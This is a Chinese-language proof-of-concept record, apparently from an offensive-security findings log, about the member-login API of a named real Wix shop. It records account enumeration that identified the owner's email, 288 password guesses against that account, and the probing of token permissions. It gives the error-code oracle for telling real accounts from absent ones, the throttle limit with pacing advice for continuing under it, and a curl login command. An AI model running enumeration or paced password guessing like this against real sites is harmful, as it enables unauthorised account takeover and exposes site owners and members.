# Wix Velo 站点同源会员登录 wix-sm-webapp/v1/auth/login：账号枚举 oracle 成立，但 LoginUserBasedThrottler 约 40 次失败触发 429(-19959)（~60s 恢复），匿名 app-instance 令牌仅可读 members/{id}、PATCH 需 Member 角色

- **code**: wix-sm-webapp-login-throttle-and-scope
- **kind**: poc
- **category**: weak-password
- **component**: Wix Velo / wix-sm-webapp
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 于 kennysbuyselltrade.co.uk 实测：30 个候选邮箱仅 kenny@ 回 401 -19976、其余 29 个回 404 -19999；288 个唯一精选口令候选全 401（0 次 200）；334 次登录 POST 触发 6 次 429 "LoginUserBasedThrottler (-19959)"，静默 62-130s 后恢复（63s 后单次探测即 401），无锁定；匿名 Velo 令牌 GET members/{id} 200 role=OWNER、PATCH 同值 nickname/language 403 RequiredRole=Member、members/current 403 Missing site member id、members/search GET 403 RequiredRole=SearchMembers。
- **path**: pocs/wix-sm-webapp-login-throttle-and-scope/poc.txt
- **tags**: wix,velo,members,login,throttle,account-enumeration,negative,wix-sm-webapp
- **created_at**: 2026-11-11T18:16:46.833Z
- **engine**: https://www.kennysbuyselltrade.co.uk/_api/wix-sm-webapp/v1/auth/login

## 用法

```
前置：Wix 站点启用 Members Area/Velo，且 /_api/v1/access-tokens 可匿名取到 appDefId 675bbcef-18d8-41f5-800e-131ec9e08762 的 instance 令牌（Authorization 头直接用，无需会员会话）。
判据：POST /_api/wix-sm-webapp/v1/auth/login body {"email":..,"password":..} → 404 "member with email [...] was not found (-19999)"=账号不存在；401 "authentication failed (-19976)"=账号存在口令错；200=登录成功（会 Set-Cookie 会话）。据此可枚举真实会员邮箱。
节流：失败累计约 38-40 次/账号触发 429 {"message":"Request throttled, too many requests by LoginUserBasedThrottler (-19959)"}，冷却约 60s（63s 后恢复），非硬锁定；受控验证请 ≥1s/请求、遇 429 停 ≥62s 再续，不要当成无节流狂打。
边界：读 members/{id} 只需匿名 app-instance 令牌（MEMBERS.MEMBER_READ，可读 role/nickname/slug/imageUrl/contactId 等，见已有 finding），但 PATCH members/{id} 需 Member 角色（403 permission_denied RequiredRole=Member），members/current 匿名 403 "Missing site member id"，members/search 需 SearchMembers 角色，tokens/verify 路由在本站 404。
示例：curl -s -X POST 'https://<site>/_api/wix-sm-webapp/v1/auth/login' -H "Authorization: <velo app-instance token>" -H 'Content-Type: application/json' -d '{"email":"owner@<site>","password":"x"}'
```

## 正文

```
同一 Wix 会员登录面在不同站点的差异点：① 账号枚举 oracle（404 -19999 vs 401 -19976）在 wix-sm-webapp 路由存在即成立；② 节流是 per-user 的 LoginUserBasedThrottler，阈值实测约 38-40 次失败，冷却约 60s，无锁定/验证码——适合受控口令验证但必须限速；③ 匿名 Velo app-instance 令牌对该 API 族只给 MEMBERS.MEMBER_READ（按已知 id 读单会员），写与列表/搜索均被 RequiredRole 拦截；④ 空/null/缺失 password 一律 400 -19988 "Password is required"，不会当作有效凭据。此条为阴性/边界情报：不要再用纯字典对 Wix 业主账号扩大尝试，也不要误以为匿名令牌可写会员档案。
```
